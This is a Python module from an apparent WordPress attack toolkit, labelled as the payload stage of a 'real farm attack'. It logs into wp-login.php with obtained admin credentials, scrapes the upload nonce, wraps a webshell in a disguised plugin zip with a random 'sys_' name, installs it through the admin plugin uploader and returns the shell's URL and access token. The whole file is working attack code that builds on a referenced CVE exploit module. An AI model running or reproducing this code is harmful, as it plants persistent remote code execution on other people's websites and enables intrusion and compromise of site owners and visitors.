"""Track B, stage 2 — with admin credentials in hand, log in and plant a
webshell using legitimate admin functionality (authenticated plugin upload).

This is the payload step of the real farm attack: once CVE-2026-0920 (or a
stolen/weak login) yields admin, WordPress itself hands you code execution.
"""
import io
import re
import secrets
import zipfile

import wp_exploit

_NONCE_RE = re.compile(r'name="_wpnonce"\s+value="([0-9a-zA-Z]+)"')


def login(base_url, http, username, password):
    """Authenticate against wp-login.php. Returns True if the session picks up
    a wordpress_logged_in cookie."""
    base = base_url.rstrip("/")
    try:
        http.get(base + "/wp-login.php")  # sets wordpress_test_cookie
        http.post(base + "/wp-login.php", data={
            "log": username, "pwd": password, "wp-submit": "Log In",
            "testcookie": "1", "redirect_to": base + "/wp-admin/",
        })
    except Exception:
        return False
    return any("wordpress_logged_in" in k for k in http.session.cookies.keys())


def _upload_nonce(http, base):
    try:
        r = http.get(base + "/wp-admin/plugin-install.php?tab=upload")
    except Exception:
        return None
    m = _NONCE_RE.search(getattr(r, "text", "") or "")
    return m.group(1) if m else None


def _build_plugin_zip(slug, filename, content):
    """A minimal valid plugin zip: a header file (so WP accepts it) plus our
    webshell. Extracts to wp-content/plugins/<slug>/."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(f"{slug}/{slug}.php", f"<?php\n/*\nPlugin Name: {slug}\n*/\n")
        z.writestr(f"{slug}/{filename}", content)
    return buf.getvalue()


def plant_plugin_shell(base_url, http, payload=None, slug=None):
    """Upload a plugin carrying a marker webshell (requires an authenticated
    admin session). Returns {url, token, variant} for verification, or None."""
    base = base_url.rstrip("/")
    slug = slug or ("sys_" + secrets.token_hex(3))
    filename, content, token = payload or wp_exploit.build_payload()
    nonce = _upload_nonce(http, base)
    if not nonce:
        return None
    zipbytes = _build_plugin_zip(slug, filename, content)
    try:
        http.post(
            base + "/wp-admin/update.php?action=upload-plugin",
            files={"pluginzip": (f"{slug}.zip", zipbytes, "application/zip")},
            data={"_wpnonce": nonce, "install-plugin-submit": "Install Now"},
        )
    except Exception:
        return None
    return {"url": f"{base}/wp-content/plugins/{slug}/{filename}",
            "token": token, "variant": f"{slug}/{filename}"}
